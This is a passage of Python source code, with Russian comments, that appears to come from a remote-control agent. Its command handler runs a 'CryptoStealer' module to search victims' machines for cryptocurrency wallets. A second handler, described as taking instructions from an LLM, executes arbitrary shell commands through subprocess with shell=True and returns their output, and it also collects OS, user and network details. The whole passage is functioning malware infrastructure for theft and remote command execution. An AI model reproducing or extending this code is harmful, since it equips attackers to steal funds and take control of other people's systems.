                        success=result.get("status") == "success",
                        data=result,
                        message=result.get("message", "")
                    )
                except Exception as e:
                    logger.error(f"Error collecting system info: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error collecting system info: {str(e)}",
                        error_code=500
                    )
            
            # Команда collect_crypto - поиск криптовалютных кошельков
            elif module_command == "collect_crypto":
                try:
                    # Импортируем модуль
                    crypto_stealer = importlib.import_module("agent_modules.crypto_stealer")
                    
                    # Создаем экземпляр CryptoStealer
                    cs = crypto_stealer.CryptoStealer()
                    
                    # Запускаем
                    result = cs.run()
                    
                    return Response(
                        command_id=command.command_id,
                        success=result.get("status") == "success",
                        data=result,
                        message=result.get("message", "")
                    )
                except Exception as e:
                    logger.error(f"Error collecting crypto wallets: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error collecting crypto wallets: {str(e)}",
                        error_code=500
                    )
            
            # Неизвестная команда
            else:
                return Response(
                    command_id=command.command_id,
                    success=False,
                    message=f"Unknown module command: {module_command}",
                    error_code=400
                )
                
        except Exception as e:
            logger.error(f"Error processing module command: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                message=f"Error processing module command: {str(e)}",
                error_code=500
            )
    
    def _process_llm_instruction(self, query: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """
        Обработка инструкций от LLM и их выполнение.
        
        Параметры:
        - query: Запрос к LLM
        - context: Контекст выполнения
        
        Возвращает:
        - Результат выполнения инструкций
        """
        import subprocess
        import os
        import json
        
        # Здесь можно обратиться к локальному LLM через API
        # Например: Ollama, llama.cpp, и т.д.
        
        # Для тестирования вернем имитацию ответа LLM
        if "execute" in query.lower():
            # Пример выполнения команды
            cmd = query.split("execute:", 1)[1].strip()
            try:
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=30)
                return {
                    "executed": True,
                    "command": cmd,
                    "stdout": stdout,
                    "stderr": stderr,
                    "exit_code": process.returncode
                }
            except Exception as e:
                return {"error": f"Execution failed: {str(e)}"}
        elif "collect_info" in query.lower():
            # Сбор информации о системе
            system_info = {}
            try:
                # Версия ОС
                process = subprocess.Popen(
                    "uname -a",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, _ = process.communicate(timeout=10)
                system_info["os"] = stdout.strip()
                
                # Информация о пользователе
                system_info["user"] = os.getenv("USER", "unknown")
                system_info["home"] = os.getenv("HOME", "unknown")
                
                # Информация о сети
                process = subprocess.Popen(
                    "ip addr | grep 'inet ' | grep -v '127.0.0.1'",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, _ = process.communicate(timeout=10)
                system_info["network"] = stdout.strip()
                
                return {
                    "collected": True,
                    "system_info": system_info
                }
            except Exception as e:
                return {"error": f"Information collection failed: {str(e)}"}
        else:
            # Общий ответ
            return {
                "message": "I'm the AI-powered agent. You can ask me to execute commands or collect information.",
                "query_received": query
            } 